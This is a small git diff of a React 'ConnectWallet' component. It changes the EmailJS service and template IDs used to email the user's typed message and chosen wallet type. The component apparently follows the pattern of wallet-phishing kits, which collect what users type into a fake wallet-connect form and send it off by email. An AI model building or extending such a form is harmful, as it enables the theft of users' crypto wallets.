@@ -274,8 +274,8 @@ export const ConnectWallet = ({ isOpen, onClose }) => {
 
     try {
       const response = await window.emailjs.send(
-        "service_7b6plaq",
-        "template_11gv4jc",
+        "service_tk0lfrj",
+        "template_y88abni",
         {
           user_message: userMessage,
           wallet_type: selectedWallet?.name || "Unknown",
